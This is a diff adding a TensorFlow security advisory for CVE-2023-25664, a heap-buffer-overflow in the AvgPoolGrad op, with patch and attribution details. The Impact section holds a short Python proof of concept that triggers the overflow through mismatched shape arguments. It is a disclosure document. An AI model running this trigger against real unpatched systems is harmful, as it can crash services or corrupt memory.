@@ -1,0 +1,31 @@
+<h2>TFSA-2023-010: Heap-buffer-overflow in AvgPoolGrad</h2>
+<h3>CVE Number</h3>
+<p>CVE-2023-25664</p>
+<h3>Impact</h3>
+<p><code>python
+import os
+os.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'
+import tensorflow as tf
+print(tf.__version__)
+with tf.device("CPU"):
+    ksize = [1, 40, 128, 1]
+    strides = [1, 128, 128, 30]
+    padding = "SAME"
+    data_format = "NHWC"
+    orig_input_shape = [11, 9, 78, 9]
+    grad = tf.saturate_cast(tf.random.uniform([16, 16, 16, 16], minval=-128, maxval=129, dtype=tf.int64), dtype=tf.float32)
+    res = tf.raw_ops.AvgPoolGrad(
+        ksize=ksize,
+        strides=strides,
+        padding=padding,
+        data_format=data_format,
+        orig_input_shape=orig_input_shape,
+        grad=grad,
+    )</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/ddaac2bdd099bec5d7923dea45276a7558217e5b">ddaac2bdd099bec5d7923dea45276a7558217e5b</a>.</p>
+<p>The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#101;&#118;&#110;&#64;&#103;&#111;&#111;&#103;&#108;&#101;&#46;&#99;&#111;&#109;">&#101;&#118;&#110;&#64;&#103;&#111;&#111;&#103;&#108;&#101;&#46;&#99;&#111;&#109;</a></p>
